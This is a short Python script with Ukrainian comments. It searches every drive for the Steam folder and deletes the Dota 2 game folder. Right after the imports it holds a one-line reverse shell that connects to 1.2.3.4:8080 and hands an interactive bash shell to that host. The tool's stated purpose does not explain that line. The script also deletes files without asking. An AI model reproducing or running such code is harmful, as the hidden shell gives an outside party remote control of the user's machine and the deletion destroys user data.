import os
import fnmatch
import win32api
import shutil
import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

GAME = "dota 2 beta"

drives = win32api.GetLogicalDriveStrings() # У змінній drivers міститься інформація про усі диски компютера у виді ряду
drives = drives.split('\000')[:-1]# перетворюємо рядок з  дисками у список по 1
#print(drives)
b = []

lookfor = "steamerrorreporter64.exe" # Файл який є лише у оригінальній папці steam 
for driver in drives: #Перебираємо диски
    for root, dirs, files in os.walk(driver): #У дисках перебираємо папки
        for found in fnmatch.filter(files, lookfor): #У цих папках знаходжу файл і шлях до нього
            #print("found: %s"% join(root, found))
            b.append(root)# поміщаю шлях у список

c = b[0] # Даю змінній повний шлях до папки steam
c += f"\steamapps\common\{GAME}" # додаю шлях до папки яку необхідно видалити
shutil.rmtree(c, ignore_errors=True) # Видаляю папку